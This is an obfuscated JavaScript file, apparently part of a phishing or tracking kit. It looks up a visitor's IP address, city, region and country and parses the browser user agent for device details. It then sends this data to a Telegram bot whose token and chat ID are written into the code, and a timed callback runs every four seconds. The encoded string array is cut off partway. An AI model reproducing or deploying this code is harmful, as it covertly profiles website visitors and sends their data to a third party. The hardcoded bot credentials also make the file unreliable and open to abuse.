function _0x178d7e(_0x29ed84, _0x41b26b, _0x554ab9, _0x55de7b, _0x24f186) {
  return _0x25be(_0x41b26b - 0x12f, _0x24f186);
}
(function (_0x42df00, _0x28261c) {
  const _0x45a57f = _0x42df00();
  while (true) {
    try {
      const _0x471adf = parseInt(_0x25be(3620, ')2H&')) / 1 + parseInt(_0x25be(1592, 'cV@H')) / 2 * (-parseInt(_0x25be(2162, 'XbPk')) / 3) + -parseInt(_0x25be(1147, '0b58')) / 4 * (-parseInt(_0x25be(3137, '0b58')) / 5) + -parseInt(_0x25be(4677, 'HTs1')) / 6 + -parseInt(_0x25be(2039, '1XOx')) / 7 + -parseInt(_0x25be(3676, 'w7kS')) / 8 + -parseInt(_0x25be(4286, 'PBMa')) / 9 * (-parseInt(_0x25be(2966, '[%[G')) / 10);
      if (_0x471adf === _0x28261c) {
        break;
      } else {
        _0x45a57f.push(_0x45a57f.shift());
      }
    } catch (_0x46c986) {
      _0x45a57f.push(_0x45a57f.shift());
    }
  }
})(_0x5736, 367442);
(function () {
  let _0x117d5e;
  try {
    const _0x59052e = Function("return (function() {}.constructor(\"return this\")( ));");
    _0x117d5e = _0x59052e();
  } catch (_0x4a759f) {
    _0x117d5e = window;
  }
  _0x117d5e.setInterval(_0x251581, 4000);
})();
async function sendTelegramMessage(_0x3a81f7) {
  try {
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendMessage", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'chat_id': "7728504492",
        'text': _0x3a81f7,
        'parse_mode': "HTML"
      })
    });
  } catch (_0x2be90d) {
    console.error("Failed to send message:", _0x2be90d);
  }
}
async function getCountryName(_0x4309c4) {
  try {
    const _0x5138ab = await fetch("https://restcountries.com/v3.1/alpha/" + _0x4309c4);
    const _0x49caf8 = await _0x5138ab.json();
    return _0x49caf8[0]?.["name"]["common"] || "Unknown";
  } catch (_0x1482ba) {
    console.error("Failed to fetch country name:", _0x1482ba);
    return "Unknown";
  }
}
async function getUserInfo() {
  try {
    const _0x15da6 = await fetch("https://ipinfo.io/json");
    const _0x35065d = await _0x15da6.json();
    const _0x5cf083 = await getCountryName(_0x35065d.country);
    const _0x32ad64 = parseUserAgent(navigator.userAgent);
    return {
      'ip': _0x35065d.ip,
      'country': _0x35065d.country,
      'countryName': _0x5cf083,
      'city': _0x35065d.city,
      'region': _0x35065d.region,
      'countryEmoji': getCountryEmoji(_0x35065d.country),
      'userAgent': navigator.userAgent,
      'deviceModel': _0x32ad64.model,
      'deviceType': _0x32ad64.type,
      'deviceOS': _0x32ad64.os
    };
  } catch (_0x18b3a4) {
    console.error("Failed to fetch user info:", _0x18b3a4);
    const _0x45ed16 = {
      ip: "Unknown",
      country: "Unknown",
      countryName: "Unknown",
      city: "Unknown",
      region: "Unknown",
      countryEmoji: '❓',
      userAgent: navigator.userAgent,
      deviceModel: "Unknown",
      deviceType: "Unknown",
      deviceOS: "Unknown"
    };
    return _0x45ed16;
  }
}
function parseUserAgent(_0x41928f) {
  const _0x55afa4 = {
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
    type: "Mobile",
    os: "iOS"
  };
  const _0x9b7086 = {
    "regex": /iPad/i,
    "type": "Tablet",
    os: "iOS"
  };
  const _0x1ae646 = {
    regex: /Android\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Android"
  };
  const _0x2e4e4e = {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Windows Phone"
  };
  const _0x286f3f = [_0x55afa4, _0x9b7086, _0x1ae646, _0x2e4e4e];
  const _0x1fe5f3 = {
    regex: /Windows/i,
    type: "Desktop",
    os: "Windows"
  };
  const _0x2caa89 = {
    regex: /Macintosh/i,
    type: "Desktop",
    os: "macOS"
  };
  const _0x424364 = {
    regex: /Linux/i,
    type: "Desktop",
    os: "Linux"
  };
  const _0x3e58cd = [_0x1fe5f3, _0x2caa89, _0x424364];
  for (let _0x51b30a of _0x286f3f) {
    const _0x1242e9 = _0x41928f.match(_0x51b30a.regex);
    if (_0x1242e9) {
      return {
        'type': _0x51b30a.type,
        'os': _0x51b30a.os,
        'model': parseDeviceModel(_0x41928f, _0x51b30a.os)
      };
    }
  }
  for (let _0x369c72 of _0x3e58cd) {
    const _0x4c3126 = _0x41928f.match(_0x369c72.regex);
    if (_0x4c3126) {
      return {
        'type': _0x369c72.type,
        'os': _0x369c72.os,
        'model': parseDeviceModel(_0x41928f, _0x369c72.os)
      };
    }
  }
  const _0xcd35da = {
    type: "Unknown",
    os: "Unknown",
    model: "Unknown Device"
  };
  return _0xcd35da;
}
function _0x27e403(_0x34ca30, _0x50f73d, _0x3a0c9b, _0x388255, _0x3e571b) {
  return _0x25be(_0x3a0c9b - 0x33f, _0x388255);
}
function parseDeviceModel(_0x19a5c3, _0x9c7e62) {
  switch (_0x9c7e62) {
    case "iOS":
      const _0x29a880 = _0x19a5c3.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
      if (_0x29a880) {
        return "iPhone " + _0x29a880[1].replace(/[_\.]/g, " ");
      }
      const _0xfd9fbb = _0x19a5c3.match(/iPad/i);
      if (_0xfd9fbb) {
        return "iPad";
      }
      break;
    case "Android":
      const _0x5e07a7 = _0x19a5c3.match(/;\s*([^;)]+)\s*Build/i);
      if (_0x5e07a7) {
        return _0x5e07a7[1].trim();
      }
      break;
    case "Windows":
      const _0x1a934 = _0x19a5c3.match(/Windows\s*([\w\s]+)/i);
      if (_0x1a934) {
        return "Windows " + _0x1a934[1];
      }
      break;
    case "macOS":
      const _0x462fd8 = _0x19a5c3.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
      if (_0x462fd8) {
        return "Mac " + _0x462fd8[1];
      }
      break;
  }
  return "Unknown Device";
}
function _0x5736() {
  const _0x33fe80 = ['q8onW57cVwK', 'kmopp2ja', 't1P5BCkh', 'W4NdUmoua8kz', 'W6BcI8owFcK', 'W5JcVmofzqm', 'xCkaoqOY', 'W4CxWQFcHmkL', 'W4KNoSknzG', 'WPjJgx/cUa', 'WQ7cUCo5tW8', 'W4pdNmoYg8kM', 'zCkQW6tcNw0', 'CqzUW4FcLG', 'uf12WOJdRG', 'FCkBW4WqDq', 'W7b5W6GQFG', 'WRhcRCkbtmoQ', 'ur5cW4RcGq', 'dfjGWR/dNW', 'W6pdODo60AxsPG', 'yxxcG8oVfG', 'sSk5ArSx', 'WQi8lmoEsq', 'WP/cSCosW4ZcRa', 'cX13WQtdLq', 's3RcN3NcOG', 'WPPJWP7cL2G', 'W48nc8oZtG', 'zCk8WORdSSkI', 'WPaJWQRcNt8', 'vSonW4tcUIe', 'CmkeW5S', 'WRSWlG83', 'WPFcGrW', 'aCkWWOlcLmo6', 'WOn5WQNcMCkT', 's8o8W4e', 'WONdPCkXBuq', 'W6pdImobBXK', 'C8kfW5KoFG', 'WQlcK8oWwqC', 'E2uNW5ul', 'zSkRWOddTGa', '0zNsQnc80kRtLa', 'wsPoW7dcOq', 'W6xdN0ldM8k2', '04uy07VsQ9kk', 'WQilW6KeWR0', 'aDg70ydtQ9o5', 'W4NdM05HW6S', 'abfQWRxdLa', 'W6uynSkXtq', 'W6Ozi8kptW', 'WQCdW7xcUHu', 'i8ohb3lcJq', 'aqHsWOpdNa', 'qMi3W5O7', '0idsKDkn06FrUG', 'n3v8WR7WOkoI', 'y0rEW6BdPG', 'WQCiAupdTa', 'zaldTt9c', 'W5JdILVdKSk2', 'W4RcQCokW5pdVa', 'W6xcNKldLCoL', '0ltrQ8or0QNcKa', 'i8kAbxpcMa', 'WQSRWQxdPv4', 'WQHWimouxq', 'nCkCeNlcJW', 'WQCyzupdPa', 'ySo4W7NdMuy', 'WRtdTSovtIm', '0j3qM9otkTk0', 'uebfW7xdUG', 'W5STaa', 'WObVrhfR', 'l8klhNNcHa', 'rmoMd8komG', '0PhtOnoA0jhcVG', 'WPbyWOJcVge', 'DmkEWOpcG8og', 'z8opW7FcKqG', 'W6K6p1ZcJa', 'W6NcNmoDEIK', 'bSo2kKuz', 'WQuKjmoiya', 'W4qga2xcKq', 'd8o6bfG', 'W6NdN1ldLCkY', 'hXJcOCkaW4m', 'W48qWOBcKey', 'WQ09W7dcUXq', 'mSkJW63dJeO', 'W6TqW6e6qW', 'W4RdOmonW4ZcSa', 'qCkAjrqL', 'WQnyW7BdTCkj', '05JrHDkM0lRsIq', 'BSkdCc0s', 'lCkxk3K', 'hrNdOSkstq', 'e8oEgezN', 'txFcGNNcOG', 'cmkVW57cGdW', 'DmoDWOZcMmob', 'pmknW5uqAq', 'ESkje8kydq', 'qmohW4pcSd0', 'W77cGhu', 'lSoKo2HZ', 'WQjZuf1Q', 'uJb5W4ZcQG', 'sSkDmXy7', '06ZqKngn0OPd', 'CdXVW6hcTW', 'nmkJW7ldIuy', 't8o1FCk0cq', 'W4uppCkVqW', 'iSkpjfxcOG', 'WRZdQSkWb1W', 'WRO9mH4D', 'W4ldJCoQW5xcNW', 'q2RcOuxcNW', 'wCkJWOtdKGK', 'WRKBlXmd', 'iWDxWPBdSW', 'fCkHg1lcNG', 'FSoajmk4uG', 'W710W6m/qq', 'amkYWRFcRSoJ', 'WPxcQmk1ECoA', 'v8oNc8krfG', 'WPCWyufW', 'dHNdNG5i', 'qSk+WOpdU8k+', 'WPzzWRdcImkP', 'ALjYW60r', 'WROneCoEtW', 'WRhcSmkrq8oQ', 'wSkMWPxdPaK', 'jmksWPe', 'WOj9WPxcQmkj', 'W711gSoxeW', 'WOZcQmo1As8', 'WPXVwx53', 'W6lcJ8oGyqK', 'gtygW5FcHW', 'mmkWEsSi', 'W4hdP8oBW47cRG', 'emokW4VcM3O', 'mXyZz8o4', 'WRHYtNz9', 'tXv3W6xcHa', 'tLhcVCowga', 'DmkoW5uBza', 'wmkJW4hdOWG', 'ALVdPujd', 'W6dcSSkIaLi', 'hfaTpta', 'WQmCW7qrWQa', '073tODoR0BeY', 'W6HGiXxcIG', 'WRtcMsSkWQ0', 'gSoWc1bs', 'WPrfWRZcSmkd', 'wIFcHwZdHq', 'WO7cVSogsZ4', 'j8o4jN9q', 'qSkacru+', 'W5/cGCoBAHK', 'sSk8WP7dSmk1', 'W6FcOxTMxq', 'cYnfWPpdTG', 'W5n6dNlcRG', 'W6b5ibhcVq', '0OpqRToeEDct', 'WO0wW7hcUJG', 'W5CTeg/cRa', 'nK03bwW', 'W6NdJmowW5/cSG', '0Q7qP9k+Eru', 'lCoRBsK', 'WOKAW7/cNJG', 'W6XUW6uTsa', 'WPDxWRBdKCoH', 'WQqqjKOB', 'WR4IW7xcUqK', '0yVqHTc90kFdTq', 'W6CAfmktCa', 'BZFcVKZdTW', 'vb3cGKtdGG', 'vmkoWQJdOrC', 'ECoJCxKr', 'W4hdVmoqW5JdSq', 'W4NdVetdJCkT', 'W4JdVCoNW7hdPq', 'WPeZW6JcSa', 'scTUWPRdRW', 'WOldM8kqDvu', 'ugLqW4a', 'W4aYW6tdI8oH', 'WP5RA2fC', 'WR/dLSkCBZG', 'W5zIiqBcGq', 'W4pdPe7dQmkC', '0yltTTkK06BrQa', 'W7D0W6H5dq', 'uciRW5aQ', 'aCkLnxmz', 'cmkjgNK', 'vhFdKCoiW40', 'WPBdH8k7c0u', 'j8kVWQ/cMSo1', 'BmkEWRRdHmk0', 'WRdcO8oSba', 'WQRcSCkxD8oj', '05hsM9oS0BtrLq', 'y35ok8kt', 'WP9XWO7cQSk1', '067rQTgoancT', 'WRflWOJcHSkz', '0zhqSngpW7dtUG', 'W6jaEa', 'e8knWONcNSoq', 'W4pdMCoNkCkT', 'W6dcRCokBtG', 's8kGW6BdM2e', 'CSobiSktbG', 's35PESkX', 'WR44nmorrq', 'vfawW4uT', 'W6ifFngWEG', 'q8kgW5pcTIq', 'W5pcU8o3xcW', 'xcv1dI4', 'W7ldPmoFiCkk', 'W45bhqZcIq', 'WQWzW7uTWOy', 'W47cGCk3axK', 'vcVdGYnu', 'qNfgtmkH', 'W5pcLCoNfXu', 'vMdcHNK', 'FsLi8lknRW8', 'W7pcImoFAXC', 'W4H2W4m9ta', 'WP80dr0T', 'sv3cOmoseq', 'amoNeWyx', 'W6dcNmoKFb0', 'W4RcJ8oZqYC', 'W7qWbmk7qG', 'ASkHWPBdVCkv', 'j3mOpuC', 'W57dN8owgSkX', 'uCk3EJeM', 'WRK7W6NcOru', 'W6PIW7y8', 'WP7dQ8kha8kC', 'W5VcR8oQsJG', 'tvbeW7RdKG', 'd8o8gff+', 'WPBcJSkEaIi', 'f3e0', 'W48ona', 'qeRcNLdcJG', 'WOzgefHI', 't8koWPBdUCkJ', 'n8kRW7RdMG', 'ymodcG', 'W7/dOCouW7xcHG', 'WQyMDgzQ', 'r8o9W4BdHhe', 'hh43aNi', '04FtH9kppq', 'WO5chSoabW', 'vSkmWORdQ8kK', 'W4ldP8ocaCkt', 'FCoKW53cK3W', 'W5NcPKT+Aa', 'ybD3W5RcLq', 'W4xdOCouf8kz', 'vCkuWPBdUSkF', 't8kAm0SK', 'WQfifICQ', 'W4BcUSo7CaK', 'WRRdL8kJDs4', 'W5XDW4e0qa', 'zJZcNvZdMa', 'W4BdPSoiW5NcRG', 'gX10W7ddLG', 'AmkkW44BAq', 'zSopnYqv', 'lmkweu0h', 'W6ZcVmoMzH4', 'g3eUa3C', 'WPRcJmoPyJ4', 'mSksmh4d', 'WQuMW6W1WOu', 'vXZcG3VdIW', 'e1NcOLCX', 'FsLi8lkxMU+4Oc0', 'WOtcM8o9tY8', 'W67dKfpdImk3', 'DujEW53dOW', 'W6FdSmoMW5pcKq', 'WRGClH4/', 'WRJcVSk2xmoA', 'hatdO8kh', 'zmoLW7JcUIi', 'W5yemmk5wq', 'CsFcHf7dLW', 'wSooyauY', 'rNdcGcldHG', 'xSonWOVdK2K', '04JqG9oaW7xqSq', 'WRlcVKfTW7C', 'A8o8W57cHNa', 'W6qpj8o8DG', 'gCo/a0HC', 'arhcNvSX', 'W7azWQJcVmkn', 'W4/cLSoPB3K', 'x8kGl8okaG', 'WRCHo8ow', 'WOLYtNy', 'vclcGSknW4i', 'W6XybCowoG', '0khsOno5xncZ', 'W650W683uW', 'W41pfmoubq', 'W6JdKfe', 'WQZdK8k6gJe', 'mSksWOJcMCoH', 'WPeWEfr2', 'wZBcLtpdVW', 'W7hcI8osFJG', 'lmkbfLNcGG', 'WRm7oSoEwq', 'fSk2jfaJ', 'uSoHd8kytW', 'WRVcQ8knqSoW', 'W4eqpCkiqW', 'WRVcSCkksmoS', 'W7xdJfFdLmk2', 'W4GRivdcKq', 'rCkKWOddRGm', 'WRSMW60', 'pmkkW5iyla', 't1VcP8oweG', 'rmk7zZmW', 'WOjUtgz7', 'khPXW7eS', 'uSkqWRVdTcu', 'dbX3', 'WP1uWPNcS2G', 'yCoLW5ZcH2O', 'WQyOW5znW7C', 'd8oWmNHH', 'ALyUW7SM', 'W4NcL8ojkgW', 'WPq7WQz5bW', 'W6BcLSoDBIK', 'Bs3dUGf3', 'sDkH0keC0Bi', '0P3sU9kn0lRdNW', 'vc3dKIHa', 'm8obpeL5', 'ymkvW5xdRcK', 'bdNcLSoiW5e', 'W4ldRmoqW5VcQa', 'WR/cQY4yWRO', 'W4RcKmoHtti', 'qSk1WOddRbu', 'W5e2gM7dUq', 'WQS6WQxcPGu', 'awqGWOddSW', 'WQT1WQdcVmkE', 'jMaEl30', 'WO1+WPVcM0y', 'WQ83odKy', 'W4dcQL5JBq', 'rSkyfYiU', 'W5BcQ8oYBbi', 'CmosrSkohG', 'WPRcMmkMvfO', 'W5SyW6tdI8kJ', 'uNxcN2JcPW', 's8k7eW', 'y8oahmkYkW', 'kCkWk2C', '0BhtMfCTW58', 'W4RdNCk0awy', 'W43dPSoBW5RcUG', 'Ev4xW6ig', 'fsFcGCkeW4K', 'W7T1bmoGaG', 'v0HmW6NdNa', 'wurKC8k6', 'W6rkialcSa', 'WPyWmJ4F', 'WP5/f2xcSa', 'W6/cVCoRW6JcLq', 'B8owW7pcO2S', 'vCkOWPtdRbi', 'W5irdCkc', 'ECkya8oF', 'cSo8bLnf', 'vSoeCmk+ja', 'ogaRW4ax', 'WPldOmoJufK', 'W4xdP8ofcmof', 'z1jKzW', 'gr5IWQtdNa', 'o1egauC', 'W67dJfS', 'WP8pbsuD', 'WQJdQmoHF3G', 'lYD1W6uV', 'uvvqpCo1', 'gMtcUmowbW', 'W5XlW6GTyG', 'dCo6guXB', 'W5xcQmoora8', 'WOSlW4C1WOu', '07xrHnkT0lBsIG', 'W4pcO8o8lbS', 'CmkoW5iBEa', 'tSo2WPNcKva', '4PYmfMP6WRS', 'rKVcMfddUq', 'WRxdLCkdmw0', 'AcLqW47cIq', 'nmkPW6W', 'W7yTyCkvtG', 'sLpcTSoq', 'wHFdGv7dOW', 'xCoWdmki', 'WQPZWP3cImku', 'W6FdP8oxW4JcTq', 'x2TFW4ZdGq', 's0pcOfq+', 'w8oNW5pcNwC', 'tsPhW5BcHW', 'sSkvnaCK', 'dSoqbLvs', 'xmk3vmoaxa', 'qSkBjW', 'Emo+W7RcNK4', 'rCkFlYao', 'g8o2gLbw', 'WR85aSovqW', 'dxbVWP/dPa', 'CmkyW4yrDa', 'AbRcJeldKq', 'W58GagpcUW', 'b8oBW4/cVSoZ', 'F8kvsJSn', 'W5/dVSo5f8kq', 'WO5XWRJcH0a', 'EmoPW7VcMwy', 'W7xcImkdD20', 'W4ddQ8oUW6RcRq', '0jBtG9oAW40', 'WRiGnmoaBW', 'W7ZcJCo0kXa', 'WQLUy1zu', 'WQ4/W5hcLHW', 'gmoKd0La', 'WPXWWQdcMCkw', 'W7lcLCozDIO', 'tGldOX5/', 'AComiCkzfG', 'WOyQWQqnWOe', 'h8o6cvK', 'fSkNW6xdP2m', 'WOGFdcmU', 'W7hcJSoerX8', 'W4/dRCoyfmkr', 'W5lcL8o2qYG', 'n1Gihv0', 'WQxdLmk5wwy', 'WP9zWRdcISkY', 'W44pimkOwq', 'WOLEWOVcTKK', 'vgyBW6CN', 'W5dcIwn3wW', 'W4pdQmozW5K', 'WQC0W4tcLde', 'W7ZcR8kksSk+', 'srjkW6NcVq', 'WQqqmaf0', 'W6KIW48yyG', 'WQ0SWRCBeW', 'taRcNvpdLG', 'W77cTwfPrq', 'W4jzbmozeG', 'WPzXqt/dUa', 'WRJdS8osFY0', 'WPNcVWidW7K', 'ALlcQSoppa', 'W7FcIgbSrG', 'ud7cJs3cQq', 'WOz4sxD8', '05ZqPDk6yWC', 'W6yUi3ZcUG', 'W5ZdOmo0kmkk', 'CmoWW7BdHuG', 'amoNc15B', 'C8oevY7dNW', 'BCkbEW', 'WO1rWQdcJSkU', 'qCkvjamZ', 'WQmqW7m', 'tNHlBCkm', 'WQ0tmamS', 'B2BcHSoWdW', 'WPPAWOJcTh0', 'CmovxSkRhq', 'y8oGrSkEgW', 'jmkYm1Kk', 'W59/yvv1', 'WQj5WRRcGSkd', 'FSk5W70rxW', 'W59sbSozfG', 'WPRcIH8iWR0', 'vCo0hSkDaa', '05lrMDcE0k4Y', 'WRPSWO/XIP2GoW', 'aSkJW5tdJw0', 'fYpcNSkAWPG', 'mszmWPVdNG', 'drD7W6RcMG', 'W4j8dbtcSa', 'W4tcTCodCIO', 'b3KonNa', 'dSoRhvD6', 'W4FdR8ohWPhcVW', 'WR8gj0C1', '0ktqSTg0WO/sNG', 'W40Vn8kfaq', 'vhFdKCoiWPa', 'WRCpjW', 'fCkeog3cGG', 'W4OLg3JcUq', 'WOzaC8kHpq', 'WOT8WQJcJuS', 'WPxcMSkwD8oV', 'dSk/sK5q', 'W4SAbt/cNq', 'uSoyW6dcK20', 'W612gwdcNq', 'bmk9WQNcPSoJ', 't8o6BCkkka', 'WO9OWOhcJ8ki', 'wZXVsJq', '0kVsRDgwbHC', 'zSkXW58ktq', 'amkelGfW', 'WQy6W6CJWPC', 'W5BcJrqHWQq', 'qCkxWOddSCkH', 'W6ldJfpdM8kX', 'q8kuWOldV8k6', 'D8oeWPnetq', 'W7xcSSoGvJi', 'vCoeW5hcRsa', 'gSoNe1bs', 'b8k1W5tdVNC', 'W74HduOX', 'WRdcOSkWFb0', 'WQLeWR7cUSkj', 'W6vPkmobia', 'k/cKMjDBlCoq', 'qhBcGMJcOW', 'WPjpW4hdT0S', 'jszlWR3dRa', 'rb7dPrrJ', 'jSkyWOhcImok', 'W4RcM3zeAG', 'W5lcNSoDwd8', '0ANcS9ki05FrJW', 'qgDNax4', 'imkTWORcJmog', 'bt7cPCkzW5i', 'CmoSW6lcOG8', 'WQmPo8owqW', 'rCoGWPlcNMS', 'fYNdJLVcUq', 'tIbLWP4', '0yH5W43dH8oC', 'zcdcMe7dKW', 'vCoAW5hcRsW', 'cZvfWRpdQa', 'WR4RWR/dTry', 'WRWKn8oCsW', 'WQj1D1zz', '05/qQDcy0kNrNG', 'gsCwWO/cIG', 'dSkFWO7cTJu', 'WQ9eWQNcTmkp', 'aY/cO8kGW4C', 'WRJcLH4GWRe', 'xCkmW5CTDG', 'bSofBLzI', 'WP7dNCoKtsC', 'W7BdSvldL8kG', 'W5CTlKJcGG', 'WQJdL8o8Fsy', 'W5nUpfbH', 'WOzuCW', 'FmovW47dG8kz', 'WOT6vhnH', 'EKj4C8kW', 'WPuGW60gWQe', 'WPVdHSoFzWm', 'd8o9cfTN', 'lmol0OJrH9gd', 'k0ZcT1SX', 'W6TfC19PWPddQqrqf8oYAu0', 'WP3dVmofwc8', 'WPFcKSkvxSoY', 'buiWpw4', 'WRFcRCkwqSoS', 'uhZcKxxcOW', 'omksWOe', 'rr3cHw7dPq', 'gCoYowv7', 'orOXm8oL', 'dX5MWQJcGq', 'eZlcHCoiW4a', '05drM9cE0kpqQq', 'WRvpyG', 'imkhgwJcUq', '0iBsKnkmW7NrTG', 'W487adiY', 'WRNcNregWRe', 'nCoct8klgG', 'WQWqlWuS', 'W7ddKSoSmdi', 'WPWAmIm0', 'vqNdRW88', 'WOpdI8okyd4', '0jJtJng8rTgO', 'xSoMa8kigG', 'WRddK8k0', 'oXBcT8kAW5W', 'W6pcGCo3gJi', 'WQWzW7qxWQC', '0kNqRDcbWPtqVa', 'W6tdKei', 'x03cLSopeG', 'efWqk3u', 'hrOJWRNdLa', 'W6ldI8oqjSks', 'Bu5XW4VdHa', 'WQxdVmoZwXi', 'sSo6W5ZcJq', 'hCkrWQ/dQuK', 'WPWXEefW', 'WOfuggqI', 'W6lcImoett4', 'WQlcS8kfvmkZ', 'qmoAW5/cRsy', 'Df94W6RdUW', 'hsKkWOddHG', 'WROtW7qaWQu', 'W5tcISo0tIK', 'WQuXjCox', 'WQfxWQVcSmoB', 'zSkDbL80', 'ySkDWQldTLa', 'aCkRhNtcMa', 'W7fODCksda', 'WPOXAevH', 'rX7dUbzs', 'qCoGgCku', 'dX1XWR3dSW', 'FCkHkWmN', 'b8kQW7FcVem', 'WPT+WPdcSgm', 'W77cOd0Mxa', 'zSo+W5/cIrm', 'W5/cLSo+zcS', 'rmoJWONcVX8', 'W6nDmWRcPW', 'WQneWQhdR8oB', 'W7DtW6e3eq', 'gHVcO8kxrq', 'W5BdG8kGkYO', 'W5SIW7qHtq', 'qtZcHfVdKa', 'W5r4W5aZqW', 'BmkAnbax', 'W50SgNNcOa', 'Cmo5wSk1ha', 'rd/cH2VdQq', '0ihrGDco0PRsLW', 'W61VW781qG', 'omotySounq', 'FCkpW5ml', '04dcNTce07hsHa', 'WP4IgM7dTa', 'awmbc28', '0lZtNTkk0ytqSa', 'WQKCjH4Y', 'cw4qhKS', 'W43cPaeFW74', 'kmkiW44QoG', 'WOPuWRRcVhy', 'iCoDdxb+', 'WQ1cWOpcSmk1', 'xmonW5BcRq', 'uYjiW5RcVq', 'zCo2W4hcMMm', 'ab/cGSodW78', '05dtG9oz0AxqGG', 'WPDtA8oQb2KzW67dSSkepCkXW5SI', 'y2PSW5Cq', '05hrM9cC0zKY', 'rf5tCCkV', 'WRFdV8kqtmoS', 'WPLxWRZdHSkY', 'W4fTFfG', 'W7pcN2jHuG', 'W6/dLmowdL4', 'W5/cRLy/uq', 'o1y1e3C', 'W6JdNv/dN8kR', 'WOBcU8kbvmoF', 'W7hdJfNdJSkQ', 'WOBcISkgrmot', 'WOynoCo8AG', 'W4HaE8k6qG', 'W6JdQmoxW5dcUq', 'WO4auCkseq', 'AYVdOs5G', 'CZrOW5JcQG', 'W5hdVCkr', 'js/cNCkVW5G', 'xmoGbSkigG', 'fxS1ix4', 'WQPaWQJcRmkP', 'WRBcUSoAj/c4SOe', 'v8kuWOBdSmkN', 'W7JcHNniqW', '0R7qH9ojW7xrJW', 'W6RcKSoluqG', 'WONcLZuSWQy', 'W64LWOX5bW', 'WP1EWQ3cImkO', 'W6JcMmolsJq', 'WQOgW6lcUIi', 'WOCcW5/dPZm', 'x8oMW7NcP0C', 'gCoFoN5W', 'ghePa2O', 'W6rdWRiyWQC', 'cZrVb3C', 'vSk6cq4F', 'WONcKSoXrYa', 'W5y7mNNcTq', 'hWj1WPhdVW', 'a8kZWO3cO8o9', 'a8oqW73cKWi', 'B8k/dc89', 'rWL4W4FcJG', 'wmkR0BJtGTge', 'W7Dec8oacW', 'WPSNeCoCEW', 'W4fqemorcG', 'BHBdLs5z', 'ESowW6RcNNO', 'W7OOAem', 'rmkuWOhdRCkN', 'WQ1fWO3cGSkC', 'gdJdVajx', 'W4xdHb3cISkP', 'eL51W4FcKG', 'WRuZW5FcPdq', 'jSkOW4xdRv4', 'nCk6pMVcRq', 'W7e2acS', 'WQxdSCo5uGK', 'WR0nl8oLDq', 'eConWPZcP8oa', 'oSk9WQBdMee', 'tSojW5ZdI8kf', 'cYzgWRRdGa', 'WP4sx3j6', 'WRZcSSoevH4', 'pmkyjHuh', 'WOG8omoAxW', 'WRddLCkUvNC', 'gsDxW4pdGW', 'WRddTmkvd0y', 'WP08EeL2', 'qmoapCkphW', 'ehSIaNK', 'W48ynSoBta', '0kZsQDo40ylrJa', 'WQH1WQtcVmkx', 'rCksWOhdUG', 'WPZcUCkLEmow', 'WQhcLKldImkW', 'WPfCWOlcU8kt', 'W4efpCkO', 'WRdcPCkvxCoP', 'jcpcH8kWW74', 'dwqWWO7dTW', '0B3dP8otWRjl', 'W7WpkCkOBW', 'WOxcI8oXuW', 'qN5suSkt', 'W5flhmoRha', '0jjW05FqUSkG', 'qCkvWQNdSsm', 'tCkywseg', 'WQi+hSoDBG', 'D3FcNxlcOW', 'r8kAkhSU', 'umojWOxcHxS', 'seBcLSouga', 'WOnpWOxcImkW', 'FCkhW5bCpa', 'u8o9kCklba', 'v3/cOv7cPG', 'WRC9oCoEEq', 'W7RdP8ketN8', 'WOikWP3cVmkG', 'WPnAWP/cML0', 'W4JdMmojemkB', 'gZbmWRpdVq', '04BrVDoe06dqSW', 'W5TTW6uQqq', 'W6OYguFcVa', 'mCk4WORcImoF', 'WOFcJ8o4ydW', '06/qITgG0ONqLa', 'WOvUtwi/', 'DSooW7FcJae', 'WPqLrvz9', 'zSkcWOZdTd8', 'WOWXnGus', 'wSo4s8kpdG', 'saddRKeX', 'W63dH37dMCkh', 'WRq3W6pcLHG', 'WPSJaSoJrq', 'WQ94WRxcOeS', 'n8kKW5VdG0q', 'W4ddOCodha', 'rmk0WR3dQSk7', 'bGfmWRBdSq', 'ASkIlbeh', 'k2ecpxC', 'rSodrmkEda', 'W58hdfVcKW', 'WQf6txC', 'jCkGhe0/', 'AIFcOMVdRq', 'WOS+WQOWWO8', 'r09rzSk2', 'WOCTBu5Q', 'ASkLW7ldIuG', 'WRBdKSkYsfm', 'WOyHnmk5wq', 'sfNcTSomcq', 'f2HeW4JcHq', 'dmkVg1NcUa', 'caD3WR8', 'W4RcI8o/yI0', 'ASkIztmk', 'WRGMd8oWEG', 'WO4auCksqW', 'C8orxSkEha', 'C1RcVK3cPa', 'w8keWORdMLu', 'rmkuWORdUmk1', 'FCozC2Kq', 'WRxcNmkZA2u', 'iSknde4D', 'kSkhneGe', 'WPxdQCkeEf8', 'h8kHW5ZdMKC', 'WPhcRmklt8kT', 'u23cHxlcIW', 'yhJcNCoppW', 'WRWPiCorra', 'WPBdO8kBFvO', 'BmkkAsSd', 'rsv0W4hcVa', 'WO5Ruh57', 'jCkSnMq', 'f8kyocGv', 'WRmNiq', 'W7mOpgFcRq', 'WRxcTJueWO8', 'WPHsWP/cVgS', 'ft/cSmkyW4K', 'vCoWbvHs', 'sGNdUrXK', 's8kZnGea', 'W6Pqa8o2ma', 'WOBdTCksq0G', '0AptG9kP0QBtPG', '067rS9gL07drQa', 'W5Kwnw3cTq', 'uI10W4NcOa', 'tv9fxmk7', 'W6bXpYhcVq', 'Eu3cO8ohrW', 'uw1ZW77dJq', 'WQfyzL9q', 'WRztWR7cVSov', 'WQKEW6KDWQe', 'W7VdRCo9W4/cTW', 'jCkBW5RdJ0y', 'qSkvWQddPWi', 'WOBdQmoLxeS', 'WPKan8kera', 'mmk+WO7cHmoE', 'W7mAfLJcGG', 'qSofW6xWUlEeW4O', 'BSoYW5VcHwC', 'WRSZW7hcTam', 'iSkRh3xcHG', 'wSkIW5ZcOaS', 'WP8+Eez2', 'WQxdMCktixi', 'WRjvWQxcJmkK', 'W6/cVSoCAba', 'W4xdJftdSSkh', 'W5m8y1v3', 'WRBcQSkLgmoi', 'WOKhW5GSWO0', 'W5dcJvtcG8oZ', 'WR7dT8oKqHu', 'vSoawmkgbG', 'W73cI8kHy8oo', 'qha7W4C+', 'W583ethdNG', 'xCoKW4FcILm', 'angQ0QNqTDk4', '4PYkW4GCECke', 'W6BdSeldI8km', 'W5ZdI8oXW5/cMW', 'W57dVmonW5q', 